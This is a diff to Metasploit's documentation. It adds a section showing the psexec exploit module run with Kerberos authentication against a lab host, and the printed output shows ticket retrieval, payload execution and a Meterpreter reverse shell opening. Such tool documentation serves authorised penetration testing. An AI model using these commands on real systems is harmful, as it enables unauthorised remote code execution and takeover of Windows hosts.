@@ -185,3 +185,30 @@ use auxiliary/admin/smb/upload_file
 echo "my file" > local_file.txt
 run smb://a:p4$$w0rd@192.168.123.13/my_share/remote_file.txt lpath=./local_file.txt
 ```
+
+### Kerberos Authentication
+
+Details on the Kerberos specific option names are documented in [[Kerberos Service Authentication|kerberos/service_authentication]]
+
+Running psexec against a host:
+
+```
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
+
+[*] Started reverse TCP handler on 192.168.123.1:4444
+[*] 192.168.123.13:445 - Connecting to the server...
+[*] 192.168.123.13:445 - Authenticating to 192.168.123.13:445|demo.local as user 'Administrator'...
+[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGT-Response
+[*] 192.168.123.13:445 - 192.168.123.13:445 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_474531.bin
+[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGS-Response
+[*] 192.168.123.13:445 - 192.168.123.13:445 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_169149.bin
+[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid delegation TGS-Response
+[*] 192.168.123.13:445 - Selecting PowerShell target
+[*] 192.168.123.13:445 - Executing the payload...
+[+] 192.168.123.13:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175686 bytes) to 192.168.123.13
+[*] Meterpreter session 6 opened (192.168.123.1:4444 -> 192.168.123.13:49738) at 2023-01-18 12:09:13 +0000
+
+meterpreter >
+```
